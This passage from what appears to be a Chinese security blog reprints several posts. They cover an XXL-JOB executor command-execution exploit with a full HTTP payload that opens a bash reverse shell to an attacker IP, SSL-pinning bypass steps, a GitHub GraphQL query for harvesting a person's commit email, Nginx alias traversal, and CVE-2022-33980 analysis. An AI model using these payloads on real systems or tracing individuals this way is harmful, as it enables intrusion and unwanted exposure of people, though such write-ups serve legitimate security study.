+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(<span class="string">&quot;BEAN&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_GROOVY(<span class="string">&quot;GLUE(Java)&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_SHELL(<span class="string">&quot;GLUE(Shell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;.sh&quot;</span>), </span><br><span class="line">GLUE_PYTHON(<span class="string">&quot;GLUE(Python)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;.py&quot;</span>), </span><br><span class="line">GLUE_PHP(<span class="string">&quot;GLUE(PHP)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;.php&quot;</span>), </span><br><span class="line">GLUE_NODEJS(<span class="string">&quot;GLUE(Nodejs)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;.js&quot;</span>), </span><br><span class="line">GLUE_POWERSHELL(<span class="string">&quot;GLUE(PowerShell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>也就是说我们可以从中任意选择一种脚本语言，然后在”glueSource”:”xxx”中插入相对应的脚本代码即可执行相对应的命令。</p>
+<p>比如对方如果是linux系统的服务器，那么就可以构造反弹shell命令执行代码为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;GLUE_SHELLl&quot;</span>，</span><br><span class="line"><span class="string">&quot;glueSource&quot;</span>:<span class="string">&quot;/bin/bash / -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip:<span class="number">9999</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 394</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/09/03/XXL-JOB-Executor/1.png" alt="image"></p>
+<p>开启监听后，即可反弹回shell</p>
+<p><img src="/2023/09/03/XXL-JOB-Executor/2.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Xposed-HTTPS/">
+                夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="夜神模拟器xposed框架justtrustme用来禁用-绕过-ssl-证书检查来突破ssl-pinning">夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/kai402458953/article/details/99483077">sort浅忆</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>1.夜神模拟器官网下载安装 模拟器</p>
+<p>2.创建一个安卓5.1版本的模拟器</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/1.png" alt="image"></p>
+<p>3.把xposed.apk  拖入夜神模拟器 （ Android 5.1.版本，xposed3.1.5 版本） </p>
+<p><img src="/2023/09/03/Xposed-HTTPS/2.png" alt="image"></p>
+<p>4.安装xposed框架</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/3.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/4.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/5.png" alt="image"></p>
+<p>下载安装完成后， 重启系统</p>
+<p>5.安装JustTrustMe.apk   </p>
+<p>点击“模块”，此时还没有可用的模块，同样的方法点击apk+导入之前下载好的JustTrustMe的apk安装包，系统会自动安装，安装完成后，在模块里面点击“软重启”，再次打开“模块”界面，即可看到JustTrustMe，勾选一下，启用这个模块：</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/6.png" alt="image"></p>
+<p>6.重启生效， 接下载安装 fiddler证书， 设置WLAN代理</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Github-Find-Email/">
+                如何通过 Github 找到一个人？
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="如何通过-github-找到一个人">如何通过 Github 找到一个人？</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ixiqin.com/2020/01/08/how-to-find-a-person-through-making/#:~:text=%E6%83%B3%E8%A6%81%E9%80%9A%E8%BF%87%20Git%20%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E4%BD%BF%E7%94%A8%20Github%20%E6%8F%90%E4%BE%9B%E7%9A%84%20GraphQL%20%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E7%AE%80%E5%8D%95%E6%96%B9%E4%BE%BF%E3%80%82%20%E8%AE%BF%E9%97%AE,in%20%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BD%A0%E7%9A%84%20Github%20%E8%B4%A6%E5%8F%B7%E7%99%BB%E9%99%86%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%20Github%20%E7%9A%84%20API%20%E4%BA%86%E3%80%82">白宦成</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>很多时候，我们都需要找到一个人的联系方式。但是，并不是每一次我们都可以很好的拿到他的联系方式，这个时候，我们就需要借助一些奇技淫巧来找到一个人的联系方式。</p>
+</blockquote>
+<h2><span id="requirements">Requirements</span></h2><blockquote>
+<p>Github 账号</p>
+<p>你要找的人的 GitHub 账号（需要其账号下有仓库）</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>在我们使用 Git 进行版本控制时，一开始，我们会被要求设置一个 Git 的用户名和邮箱，就像下面这样。</p>
+<p><img src="/2023/09/03/Github-Find-Email/1.png" alt="image"></p>
+<p>后续，我们的每一个 Commit 都会基于我们填写的用户名和邮箱来进行存储。我们只需要查询一个人在 Github 的提交记录，就可以找到他填写在 Git 中的邮箱和名字，从而方便我们更进一步找到这个人。</p>
+</blockquote>
+<h2><span id="实践">实践</span></h2><blockquote>
+<p>想要通过 Git 找到一个人的邮箱，最简单的方法就是使用 Github 提供的 GraphQL 来进行查询，简单方便。</p>
+<p>访问Github 的 GraphQL API Explorer，点击右侧的 Sign in ，使用你的 Github 账号登陆，这样就可以调用 Github 的 API 了。</p>
+<p><img src="/2023/09/03/Github-Find-Email/2.png" alt="image"></p>
+<p>登陆后，你下方的 GraphQL 输入框就可以输入内容了。在其中输入如下代码</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  repository(name: <span class="string">&quot;grank&quot;</span>, owner: <span class="string">&quot;lctt&quot;</span>) &#123;</span><br><span class="line">    ref(qualifiedName: <span class="string">&quot;master&quot;</span>) &#123;</span><br><span class="line">      target &#123;</span><br><span class="line">        ... on Commit &#123;</span><br><span class="line">          id</span><br><span class="line">          <span class="title function_">history</span><span class="params">(first: <span class="number">5</span>)</span> &#123;</span><br><span class="line">            edges &#123;</span><br><span class="line">              node &#123;</span><br><span class="line">                author &#123;</span><br><span class="line">                  name</span><br><span class="line">                  email</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>并将 name 替换为你要查询的人的 repo 名，owner 改为你需要查询的人的名字，然后点击执行按钮。</p>
+<p><img src="/2023/09/03/Github-Find-Email/3.png" alt="image"></p>
+<p>右侧会出现你的执行结果，你会发现，其中出现我们想要的“邮箱”地址。</p>
+<p><img src="/2023/09/03/Github-Find-Email/4.png" alt="image"></p>
+<p>你会发现，这里其实有两种类型的邮箱，一种是我们常见的，自己用的各种免费邮箱，比如 @qq.com、@gmail.com、@foxmail.com 之类的；另一种是形如 27856297+dependabot-preview[bot]@users.noreply.github.com 这样的邮箱。</p>
+<p>这两种邮箱的区别是，前者是我们自己通过 git 设置的邮箱，而后者则是我们通过 Github 网页、 API 操作产生的 commit 。你在查询的时候，要记得去找第一类邮箱来作为参考。</p>
+<p>当然，不排除有开发者在看了本篇文章后，去用 private 邮箱修改自己本地的 Git ，那就没办法了。</p>
+<p>找到这个邮箱以后怎么办呢？</p>
+<p>直接发邮件联系<br>如果是 QQ 邮箱、 Foxmail ，可以试着直接用邮箱，或者邮箱里的 QQ 号加好友。<br>通过 Google 搜索这个邮箱，查找其他的关联信息。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Github/" rel="tag">Github</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Nginx-Alias/">
+                Nginx错误配置alias导致目录遍历漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="nginx错误配置alias导致目录遍历漏洞">Nginx错误配置alias导致目录遍历漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">BlackWolf</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
+<p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。</p>
+</blockquote>
+<h2><span id="0x01-环境搭建">0x01 环境搭建</span></h2><blockquote>
+<p>使用richarvey&#x2F;nginx-php-fpm镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80  richarvey/nginx-php-fpm</span><br></pre></td></tr></table></figure>
+
+<p>配置nginx，添加配置test路由解析到&#x2F;var&#x2F;www&#x2F;html&#x2F;路径（注意：&#x2F;test没有结尾的&#x2F;）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/nginx/sites-available/default.conf</span><br><span class="line">location /test &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--var</span><br><span class="line">   |--www</span><br><span class="line">      |--flag.txt</span><br><span class="line">      |--html</span><br><span class="line">         |--index.php</span><br><span class="line">         |--test.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><blockquote>
+<p>通过访问<a target="_blank" rel="noopener" href="http://127.0.0.1/test/test.txt">http://127.0.0.1/test/test.txt</a></p>
+<p>可以成功访问到test的内容如下(&#x2F;test&#x2F;test.txt路由请求，经处理后转换成：&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt)：</p>
+<p><code>this is a test</code></p>
+<p>修改请求为<a target="_blank" rel="noopener" href="http://127.0.0.1/test../flag.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%B7%B3%E5%88%B0%E4%B8%8A%E4%B8%80%E5%B1%82%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0flag.txt%E7%9A%84%E5%86%85%E5%AE%B9(%60/test../flag.txt%60%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%BB%8F%E5%A4%84%E7%90%86%E5%90%8E%E8%BD%AC%E6%8D%A2%E6%88%90%EF%BC%9A%60/var/www/flag.txt%60)">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p>
+<p><code>you get me, hahaha</code></p>
+</blockquote>
+<h2><span id="0x03-小结">0x03 小结</span></h2><blockquote>
+<p>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</p>
+<p>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</p>
+<p>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</p>
+</blockquote>
+<h2><span id="0x04-参考链接">0x04 参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/317201">https://hackerone.com/reports/317201</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/312510">https://hackerone.com/reports/312510</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Crossdomain-XML/">
+                怎么把网站crossdomain.xml配置风险去除
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="怎么把网站crossdomainxml配置风险去除">怎么把网站crossdomain.xml配置风险去除</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/AoJYq0YYQe">nanjingbolg</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>打开程序目录下的crossdomain.xml文件，确保配置只对提供安全资源的可信域开放：</p>
+<p>源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE cross-domain-policy SYSTEM ”http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd”&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=”*” /&gt;&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件中的allow-access-from 实体设置为星号设置为允许任何域访问，将其修改为:</p>
+<p><code>&lt;allow-access-from domain=”*.17showshow.com” /&gt;</code></p>
+<p>*.17showshow.com 换为您自己的域名(注意是一级域名)。</p>
+<p>表示只允许本域访问，该问题就解决了。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XML/" rel="tag">XML</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
+                关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="关于cve-2022-33980-apache-commons-configuration-远程命令执行漏洞分析">关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/543936119">星阑科技</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>7月6日，Apache官方发布安全公告，修复了一个存在于Apache Commons Configuration 组件的远程代码执行漏洞，漏洞编号：CVE-2022-33980，漏洞威胁等级：高危。恶意攻击者通过该漏洞，可在目标服务器上实现任意代码执行。</p>
+</blockquote>
+<h2><span id="相关介绍">相关介绍</span></h2><blockquote>
+<p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理，提高开发效率和软件的可维护性。</p>
+</blockquote>
+<h2><span id="利用范围">利用范围</span></h2><blockquote>
+<p>2.4 &lt;&#x3D; Apache Commons Configuration &lt;&#x3D;2.7</p>
+</blockquote>
+<h2><span id="前置知识">前置知识</span></h2><blockquote>
+<p>什么是变量插值？</p>
+<p>通常我们用apach的configuration2库来管理配置文件(org.apache.commons:commons-configuration2),在commons-configuration2管理的配置文件中，配置变量的值可以引用变量。举个例子：${env:xxhzz}就指代环境变量xxhzz，在commons-configuration2中这种引用动态变量的方式就叫变量插值。</p>
+<p>变量插值解析：在commons-configuration2中，负责对字符串中的变量进行解析的是org.apache.commons.configuration2.interpol.ConfigurationInterpolator类中的interpolate(Object)方法。</p>
+</blockquote>
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/1.png" alt="image"></p>
+<p>从漏洞通告中，可以得知Apache Commons Configuration执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的org.apache.commons.configuration2.interpol.Lookup 实例。</p>
+<p>从2.4版到2.7版，默认的Lookup实例集包括可能导致任意代码执行或与远程服务器联系的插值器。如公告中提到“script” 可使用JVM脚本执行引擎(javax.script)执行表达式，若使用了不受信任的配置值，在受影响的版本中使用插值默认值的应用程序就很可能受到远程代码执行的影响。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>了解了漏洞原理后，为更好理解漏洞的形成，需构建一个调试的demo环境。</p>
+<p>通过maven直接引入Apache Commons Configuration2.7。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/2.png" alt="image"></p>
+<p>接着构建一个触发漏洞的主类即可</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="动态调式">动态调式</span></h2><blockquote>
+<p>在对插值变量进行解析的地方打下断点。</p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/4.png" alt="image"></p>
+<p>开启debug模式，在经过了前两个if判断之后，随后会进入resolveSingleVariable函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/5.png" alt="image"></p>
+<p>在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable中首先跟一下extractVariableName函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/6.png" alt="image"></p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName的作用是提取变量字符串strValue。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/7.png" alt="image"></p>
+<p>随后进入org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve函数中，通过index0f查找和判断条件，从变量字符串中分别获取到prefix和name。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/8.png" alt="image"></p>
+<p>继续跟进会进入lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/9.png" alt="image"></p>
+<p>在分析lookup函数前先跟进下fetchLookupForPrefix函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/10.png" alt="image"></p>
+<p>fetchLookupForPrefix函数的作用是获取到stringLookup对象。</p>
+<p>继续跟进，会进入commons-text-1.8.jar包中的org.apache.commons.text.lookup.ScriptStringLookup#lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/11.png" alt="image"></p>
+<p>在org.apache.commons.text.lookup.ScriptStringLookup#lookup函数中会再次对字符串进行分割，分别提取engineName和script。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/12.png" alt="image"></p>
+<p>接着会通过getEngineByName函数获取ScriptEngine（javax.script)。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/13.png" alt="image"></p>
+<p>继续往下，出现eval函数。而我们知道eval函数可计算某个字符串，并执行其中的的JavaScript 代码。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/14.png" alt="image"></p>
+<p>继续往下将成功触发我们传入的payload，造成远程命令执行。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/15.png" alt="image"></p>
+<p>​成功命令执行。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到 Apache Commons Configuration 2.8.0 版本。<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-configuration/download_configuration.cgi">https://commons.apache.org/proper/commons-configuration/download_configuration.cgi</a></p>
+</blockquote>
+<h2><span id="参考材料">参考材料</span></h2><blockquote>
+<p>1.<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s">https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s</a><br>2.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/devel">https://cloud.tencent.com/devel</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Plaintext-VIEWSTATE/">
+                未加密的__VIEWSTATE参数
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="未加密的__viewstate参数">未加密的__VIEWSTATE参数</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121357450">默默提升实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="0-知识补充">0. 知识补充</span></h2><blockquote>
+<p>表单提交在遇到服务器返回错误时候，再次填写表单时，上次填写的值不会被清空。</p>
+<p>维持ViewState是ASP.NET Web Forms的默认设置。如果你想不维持ViewState，需在.aspx页面顶部包含提示&lt;%@Page EnableViewState&#x3D;“false” %&gt;，或者或者向任意控件添加属性EnableViewState&#x3D;“false” 。</p>
+<p>没有设置维持ViewState，当点击按钮提交，表单值将消失。</p>
+</blockquote>
+<h3><span id="viewstate是如何使用的">ViewState是如何使用的</span></h3><blockquote>
+<p>ViewState 基本上由服务器生成，并以隐藏的表单字段 “_VIEWSTATE” 的形式发送给客户端，用于“POST”请求。当Web应用程序进行 POST 请求时，客户端将其发送到服务器。</p>
+<p>ViewState 以序列化数据的形式出现，当客户端再次进行请求（ViewState）被发送到服务器时，将进行反序列化。</p>
+<p>为了使 ViewState 不受篡改，存在一个启用 ViewState MAC 的选项，通过设置一个值并在反序列化期间对 ViewState 的值进行完整性检查。</p>
+</blockquote>
+<h2><span id="1-漏洞描述">1. 漏洞描述</span></h2><blockquote>
+<p>__VIEWSTATE 参数未加密，存在有人拦截存储在 ViewState 中的信息的机会。</p>
+</blockquote>
+<h2><span id="2-漏洞危害">2. 漏洞危害</span></h2><blockquote>
+<p>可能导致敏感信息泄露。</p>
+</blockquote>
+<h2><span id="3-漏洞验证">3. 漏洞验证</span></h2><blockquote>
+<p>使用工具：Burp Suit，需要安装插件ViewState Editor，如下图所示：</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/1.png" alt="image"></p>
+<p>POC：{EXTRACTED_STRINGS}:string&#x3D; -2140192582</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/2.png" alt="image"></p>
+<p>查看存在该问题的页面源码，搜索__VIEWSTATE，可以看到对应的value值，对该段值进行base64解码。可以得到对应的信息，在Burp Suit中使用 ViewState Decoder插件可以进行解码。</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/3.png" alt="image"><br><img src="/2023/09/03/Plaintext-VIEWSTATE/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="其他解码工具">其他解码工具</span></h3><blockquote>
+<p>网页：<a target="_blank" rel="noopener" href="https://www.httpdebugger.com/tools/ViewstateDecoder.aspx">https://www.httpdebugger.com/tools/ViewstateDecoder.aspx</a></p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/5.png" alt="image"></p>
+<p>软件：ViewStateDecoder2.0.exe</p>
